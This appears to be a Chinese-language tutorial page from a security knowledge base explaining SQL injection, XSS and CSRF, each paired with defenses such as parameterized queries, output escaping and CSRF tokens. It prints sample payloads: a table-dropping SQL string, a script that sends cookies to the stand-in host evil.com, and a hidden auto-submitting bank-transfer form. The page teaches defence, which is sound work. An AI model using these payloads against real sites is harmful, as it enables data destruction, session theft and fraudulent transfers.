---
id: web-security
title: Web 安全（XSS, SQL 注入, CSRF）
summary: Web 安全漏洞是 OWASP Top 10 中最常见的安全风险——XSS 注入脚本、SQL 注入操纵数据库、CSRF 伪造用户请求。输入验证和输出编码是防御核心
difficulty: intermediate
order: 4
parent: network-attacks
children:
  - malware-analysis
related: []
prerequisites:
  - network-attacks
tags:
  - security
  - web
  - owasp
createdAt: 2026-06-12
updatedAt: 2026-06-13
---

## 🌐 你的网站可能"浑身是洞"

你写了一个留言板——用户输入昵称和留言，保存到数据库，展示给其他人。

这三行看似简单的代码，可能同时包含了 **三个最常见的 Web 漏洞**。

> 📐 **OWASP Top 10**：开放 Web 应用安全项目（OWASP）每几年发布的 Web 应用十大安全风险。是 Web 开发者必知的安全指南。

---

## 💉 SQL 注入——直接操纵你的数据库

```python
# ❌ 危险：拼接用户输入
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# 攻击者输入：' OR '1'='1
# → SELECT * FROM users WHERE name = '' OR '1'='1
# → 返回所有用户！登录被绕过！

# 更危险：'; DROP TABLE users; --
# → 表被删！
```

✅ **防御**：永远用参数化查询，绝不拼接用户输入到 SQL。

---

## 📜 XSS——注入恶意脚本

你的留言板显示用户留言：

```python
# ❌ 危险：直接输出用户输入
html = f"<p>{user_comment}</p>"
# 攻击者输入：<script>fetch('evil.com?cookie='+document.cookie)</script>
# → 所有访问页面的用户 cookie 被窃取！
```

✅ **防御**：输出到 HTML 前做转义（`<script>` → `&lt;script&gt;`）。

---

## 🔀 CSRF——伪造用户的请求

用户登录了银行网站（有 Cookie）。然后访问了一个恶意网站——恶意网站偷偷向银行发请求：

```html
<!-- 在恶意网站中隐藏的自动提交表单 -->
<form action="https://bank.com/transfer" method="POST" id="hack">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

浏览器自动带上 bank.com 的 Cookie → 银行以为是用户自己发的转账请求！

✅ **防御**：CSRF Token——每个表单包含一个随机 Token，服务器验证。

---

## 🛡️ 四项核心防御原则

| 原则 | 说明 |
|:----:|------|
| **永远不信任用户输入** | 验证格式、过滤内容、转义输出 |
| **参数化查询** | 防 SQL 注入的终极方案 |
| **输出编码** | 防 XSS——用户输入输出到页面必须转义 |
| **CSRF Token** | 每个表单生成唯一 Token，服务器验证 |

---

## 📝 小结

| 漏洞 | 攻击方式 | 防御 |
|:----:|:--------:|:----:|
| **SQL 注入** | 拼接恶意 SQL 语句 | 参数化查询 |
| **XSS** | 注入恶意脚本窃取信息 | 输出编码、CSP |
| **CSRF** | 伪造请求利用用户 Cookie | CSRF Token、SameSite Cookie |
| **SSRF** | 服务端请求伪造 | URL 白名单 |

**为什么先学这个？** Web 攻击是最常见的攻击入口。接下来看看真正的"恶意代码"——[[malware-analysis|恶意软件分析]]。
